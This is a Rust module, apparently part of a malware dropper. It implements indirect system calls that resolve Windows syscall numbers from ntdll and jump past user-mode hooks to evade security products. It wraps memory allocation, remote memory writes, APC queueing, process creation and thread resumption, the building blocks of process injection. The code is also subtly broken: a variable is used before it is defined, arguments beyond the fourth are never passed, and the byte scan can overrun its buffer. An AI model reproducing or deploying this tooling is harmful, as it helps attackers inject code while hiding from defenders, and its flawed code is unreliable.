//! Indirect Syscall Stubs for Rust Dropper
//!
//! Bypasses user-mode hooks by jumping to ntdll's syscall; ret instruction.
//! No Win32 API calls for sensitive operations.
//!
//! Uses Hell's Gate-style SSN resolution + RIP spoofing.

#![allow(dead_code)]
#![cfg(windows)]

use std::ffi::c_void;
use std::arch::asm;
use crate::loader::ReflectiveLoader;

#[repr(C)]
pub struct IndirectSyscall {
    pub ssn: u32,
    pub syscall_ret_addr: u64,
}

impl IndirectSyscall {
    #[inline(never)]
    pub unsafe fn from_ntdll(func_name: &str) -> Option<Self> {
        let ntdll_base = ReflectiveLoader::find_module_by_hash(
            b"ntdll.dll\0",
            0x9f5b9c1e,
        )?;
        
        let func_hash = ReflectiveLoader::dbg2_hash_bytes(func_name.as_bytes());
        let func_addr = ReflectiveLoader::covert_get_proc_address(ntdll_base, func_addr)?;
        
        // Read stub to extract SSN and syscall instruction address
        // Pattern: mov r10, rcx (4C 8B D1) ; mov eax, imm32 (B8 XX XX 00 00) ; syscall (0F 05) ; ret (C3)
        let stub = std::slice::from_raw_parts(func_addr as *const u8, 32);
        
        let mut ssn = 0u32;
        let mut syscall_ret_addr = 0u64;
        
        // Find SSN at offset 4 (after mov r10,rcx + mov eax,imm32)
        if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 {
            ssn = (stub[4] as u32)
                | (stub[5] as u32) << 8
                | (stub[6] as u32) << 16
                | (stub[7] as u32) << 24;
            
            // Find syscall instruction (0F 05)
            for i in 8..32 {
                if stub[i] == 0x0F && stub[i + 1] == 0x05 {
                    syscall_ret_addr = func_addr + i as u64;
                    break;
                }
            }
        }
        
        if syscall_ret_addr != 0 {
            Some(Self { ssn, syscall_ret_addr })
        } else {
            None
        }
    }
}

// =============================================================================
// INDIRECT SYSCALL WRAPPERS
// =============================================================================

/// NtAllocateVirtualMemory - indirect syscall
#[inline(never)]
pub unsafe fn nt_allocate_virtual_memory(
    syscall: &IndirectSyscall,
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") zero_bits,
        in("r9") region_size,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

/// NtWriteVirtualMemory - indirect syscall
#[inline(never)]
pub unsafe fn nt_write_virtual_memory(
    syscall: &IndirectSyscall,
    process_handle: *mut c_void,
    base_address: *mut c_void,
    buffer: *const c_void,
    num_bytes_to_write: usize,
    num_bytes_written: *mut usize,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") process_handle,
        in("rdx") base_address,
        in("r8") buffer,
        in("r9") num_bytes_to_write,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

/// NtQueueApcThread - indirect syscall
#[inline(never)]
pub unsafe fn nt_queue_apc_thread(
    syscall: &IndirectSyscall,
    thread_handle: *mut c_void,
    apc_routine: *mut c_void,
    argument1: usize,
    argument2: usize,
    argument3: usize,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") thread_handle,
        in("rdx") apc_routine,
        in("r8") argument1,
        in("r9") argument2,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

/// NtCreateProcessEx - indirect syscall
#[inline(never)]
pub unsafe fn nt_create_process_ex(
    syscall: &IndirectSyscall,
    process_handle: *mut *mut c_void,
    desired_access: u32,
    object_attributes: *mut c_void,
    parent_process: *mut c_void,
    flags: u32,
    section_handle: *mut c_void,
    debug_port: *mut c_void,
    exception_port: *mut c_void,
    maximum_mimum: u32,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") process_handle,
        in("rdx") desired_access,
        in("r8") object_attributes,
        in("r9") parent_process,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}

/// NtResumeThread - indirect syscall
#[inline(never)]
pub unsafe fn nt_resume_thread(
    syscall: &IndirectSyscall,
    thread_handle: *mut c_void,
    previous_suspend_count: *mut u32,
) -> i32 {
    let mut status: i32;
    
    asm!(
        "mov r10, rcx",
        "mov eax, {ssn}",
        "jmp {syscall_addr}",
        ssn = in(reg) syscall.ssn,
        syscall_addr = in(reg) syscall.syscall_ret_addr,
        in("rcx") thread_handle,
        in("rdx") previous_suspend_count,
        lateout("rax") status,
        clobber_abi("system"),
    );
    
    status
}
